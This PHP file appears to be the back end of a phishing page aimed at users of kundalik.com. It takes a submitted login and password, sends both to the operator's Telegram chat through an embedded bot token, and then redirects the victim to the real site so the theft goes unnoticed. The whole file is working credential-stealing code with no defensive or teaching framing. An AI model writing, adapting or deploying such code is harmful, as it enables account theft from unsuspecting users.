<?php
ob_start();
date_Default_timezone_set('Asia/Tashkent');
define('API_KEY','7259013301:AAGaD_I5tHLhqd0XH3Ql1ZprS04Jf4SzSlA');
$admin = "6320467148";


function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/$method";
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$tx = $message->text;
$cid = $message->chat->id;
$mid = $message->message_id;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if(!empty($_POST['login']) && !empty($_POST['password'])){
$login = $_POST['login'];
$pass = $_POST['password'];
bot('sendMessage',[
'chat_id'=>$admin,
'text'=>"
<b>😈New Login Information:
🔒Login: $login
🔑Password: $pass </b>",
'parse_mode'=>'html',
]);
header("Location: https://kundalik.com");
exit;
}}
?>